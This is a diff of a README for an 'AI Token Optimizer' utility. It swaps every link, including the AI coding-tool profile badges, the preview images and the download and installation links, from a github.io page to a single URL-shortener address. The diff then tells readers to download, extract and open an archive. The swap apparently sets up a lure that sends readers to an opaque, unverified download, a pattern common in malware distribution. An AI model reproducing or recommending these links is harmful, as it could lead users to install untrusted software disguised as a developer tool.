@@ -6,26 +6,26 @@
 
 ## Quick Access
 
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Profile-8250df?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Codex](https://img.shields.io/badge/Codex-Profile-0969da?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Cursor](https://img.shields.io/badge/Cursor-Profile-1f883d?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-2f81f7?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Claude Code](https://img.shields.io/badge/Claude%20Code-Profile-8250df?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Codex](https://img.shields.io/badge/Codex-Profile-0969da?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Cursor](https://img.shields.io/badge/Cursor-Profile-1f883d?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-2f81f7?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ## Download
 
-➡️ **[Download AI Token Optimizer](https://idleobstacle.github.io/)**
+➡️ **[Download AI Token Optimizer](https://flyn.co/17yeN7/)**
 
 ## Preview
 
-[![Preview](assets/ai-token-optimizer-preview.png)](https://idleobstacle.github.io/)
+[![Preview](assets/ai-token-optimizer-preview.png)](https://flyn.co/17yeN7/)
 
 ### Dashboard
 
-[![Dashboard](assets/ai-token-optimizer-dashboard.png)](https://idleobstacle.github.io/)
+[![Dashboard](assets/ai-token-optimizer-dashboard.png)](https://flyn.co/17yeN7/)
 
 ### Workflow
 
-[![Workflow](assets/ai-token-optimization-workflow.png)](https://idleobstacle.github.io/)
+[![Workflow](assets/ai-token-optimization-workflow.png)](https://flyn.co/17yeN7/)
 
 > Example token counts are illustrative, not benchmark guarantees.
 
@@ -100,7 +100,7 @@ Optional external summarization backends, if ever enabled, should be clearly lab
 
 ## Installation
 
-1. **[Download AI Token Optimizer](https://idleobstacle.github.io/)**
+1. **[Download AI Token Optimizer](https://flyn.co/17yeN7/)**
 2. Extract the archive.
 3. Open the utility.
 4. Select a repository or paste context.
